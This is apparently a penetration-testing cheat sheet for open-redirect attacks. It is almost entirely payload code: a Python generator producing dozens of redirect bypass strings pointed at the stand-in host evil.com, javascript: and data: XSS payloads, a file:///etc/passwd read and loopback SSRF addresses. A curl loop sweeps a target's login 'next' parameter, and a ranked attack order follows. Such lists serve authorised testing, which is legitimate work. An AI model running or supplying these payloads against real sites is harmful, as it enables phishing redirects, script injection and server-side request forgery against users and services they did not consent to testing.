# Payload variants — the systematic arm-generation

## The generation model — one base, many arms

```python
# the base canary
CANARY = 'evil.com'

# the systematic arm-generator — each family × each encode-stage
def arms(host='evil.com', target='target.com'):
    return [
        # absolute
        f'https://{host}', f'http://{host}', f'HTTPS://{host}',
        f'https://{host}:443', f'https://{host}/',
        # scheme-relative
        f'//{host}', f'///{host}', f'////{host}',
        f'//{host}/', f'/{host}',
        # backslash
        f'/\\{host}', f'\\{host}', f'\\\\{host}', f'/\\/{host}',
        f'/%5c{host}', f'%5c{host}', f'%5c%5c{host}',
        f'/%255c{host}', f'/\\%2f{host}',
        # scheme variants
        f'https:{host}', f'https:/{host}', f'https:/\\{host}',
        f'https:\\\\{host}', f'https:%5c{host}', f'https:%2f{host}',
        f'https:/%2f{host}', f'https:///{host}',
        # userinfo
        f'https://{target}@{host}', f'https://{host}@{target}',
        f'https://{host}\\@{target}', f'https://{host}%40{target}',
        f'https://{host}%2540{target}', f'https://user:pass@{host}',
        f'https://{target}:443@{host}', f'https://{host}?@{target}',
        f'https://{host}#@{target}',
        # substring/suffix
        f'https://{target}.{host}', f'https://x.{target}.{host}',
        f'https://{target}-{host}', f'https://evil{target}',
        f'https://{host}/{target}', f'https://{host}?{target}',
        f'https://{host}#{target}', f'https://{host}/x/{target}',
        f'https://{target}%2e{host}', f'https://{target}%252e{host}',
        # encoded
        f'https%3a%2f%2f{host}', f'https%3a//{host}',
        f'https:%2f%2f{host}', f'%2f%2f{host}', f'%2f%5c{host}',
        f'https%253a%252f%252f{host}',  # double
        f'https://%65{host[1:]}', f'https://{host[:-4]}%2ecom',
        # scheme-family
        'javascript:alert(1)', 'javascript://%0aalert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox(1)', 'file:///etc/passwd', 'about:blank',
        # unicode
        f'https:%ef%bc%8f%ef%bc%8f{host}', f'https://%65vil.com',
        f'https://{host[:-4]}%ef%bc%8ecom',
        f'https://{host}%ef%bc%a0{target}',
        # whitespace/control
        f'%20https://{host}', f'%09https://{host}',
        f'%0ahttps://{host}', f'%0d%0ahttps://{host}',
        f'https://{host}%20', f' https://{host}',
        # IP-numeric (the SSRF-twin)
        'http://2130706433/', 'http://0x7f000001/', 'http://127.1/',
        'http://0177.0.0.1/', 'http://[::1]/',
    ]
```

## The URL-encode matrix — the same arm at each stage

```python
import urllib.parse
ARM = 'https://evil.com'
urllib.parse.quote(ARM)                           # https%3A%2F%2Fevil.com
urllib.parse.quote(ARM, safe='')                  # https%3A%2F%2Fevil.com
urllib.parse.quote(urllib.parse.quote(ARM))       # https%253A%252F%252Fevil.com — the double
urllib.parse.quote(ARM, safe=':/')                # https://evil.com — the minimal
urllib.parse.quote_plus(ARM)                      # https%3A%2F%2Fevil.com — the + form
```

## The per-arm curl — the sweep

```bash
for arm in 'https://evil.com' '//evil.com' '/\evil.com' '\\evil.com' \
  '/%5cevil.com' 'https:/\evil.com' 'https:%2f%2fevil.com' \
  'https%3a%2f%2fevil.com' 'https://target.com@evil.com' \
  'evil.com\@target.com' 'https://evil.com%40target.com' \
  'https://target.com.evil.com' 'https://evil.com/target.com' \
  'javascript:alert(1)' 'data:text/html,<script>alert(1)</script>' \
  'https%253a%252f%252fevil.com' 'https:%ef%bc%8f%ef%bc%8fevil.com'; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$arm")
  echo "=== $arm ==="
  curl -si "$BASE/login?next=$enc" | grep -i '^location'
done
```

## The variant-order — the cheapest-first sweep

```text
1. the absolute canary      https://evil.com       <- the baseline
2. the //                   //evil.com             <- the classic
3. the /\                   /\evil.com             <- the backslash
4. the %5c                  /%5cevil.com           <- the encoded \
5. the userinfo             https://t.com@evil.com <- the @
6. the subdomain            https://t.com.evil.com <- the suffix
7. the substring            https://evil.com/t.com <- the contains
8. the encoded              https%3a%2f%2f         <- the decode-order
9. the double-encoded       https%253a%252f%252f   <- the double-decode
10. the scheme              https:evil.com         <- the scheme-no-//
11. the javascript:         javascript:alert(1)    <- the XSS-twin
12. the unicode             %ef%bc%8f%ef%bc%8f     <- the fullwidth
```

## The variant-record

`variant: <the-arm>: <the-encode-stage>: <the-Location>` — each arm +
the stage + the verbatim Location.
